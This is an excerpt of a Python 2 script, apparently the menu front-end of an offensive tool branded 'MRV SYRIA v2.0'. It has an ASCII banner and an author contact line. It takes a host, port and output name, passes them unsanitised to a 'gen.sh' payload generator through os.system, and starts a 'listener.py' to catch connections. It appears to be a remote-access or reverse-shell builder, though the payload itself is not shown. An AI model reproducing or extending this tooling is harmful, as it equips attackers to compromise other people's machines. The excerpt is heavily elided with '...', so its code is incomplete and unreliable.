...
def logo():
 print("""
\t  __  __ _______      __   _____ __    ___ ____  _____    
\t |  \/  |  __ \ \    / /  / ____\ \   / /  __ \|_   _|   /\ 
\t | \  / | |__) \ \  / /  | (___  \ \_/ /| |__) | | |    /  \   
\t | |\/| |  _  / \ \/ /    \___ \  \   / |  _  /  | |   / /\ \.  
\t | |  | | | \ \  \  /     ____) |  | |  | | \ \ _| |_ / ____ \ 
\t |_|  |_|_|  \_\  \/     |_____/   |_|  |_|  \_\_____/_/    \_\ v2.0
...
def help():
 print("""
  ...
  Please Report This bug To My instagram 
  Insta : https://www.instagram.com/t_5_6f
  My Name Volcano963\n""")
...
def main():
    ...
    while True:
        cmd = raw_input("[*] MRV@SYRIA963:~# ").lower()
        ...
        if cmd == "help":
            ...
            if host != " " and port != " " and output != " ":
                ...
                sleep(3)
                os.system("sh gen.sh "+host+" "+str(port)+" "+output)
            ...
            if host != " " and port != " ":
                if os.name == "nt":
                    subprocess.Popen([sys.executable, 'listener.py', host, str(port)], creationflags=subprocess.CREATE_NEW_CONSOLE)
                else:
                    os.system(sys.executable + " listener.py %s %s"%(host, str(port)))
            else:
                print "\n[!] Host : %s\n[!] Port : %s\n"%(host,port)
        else:
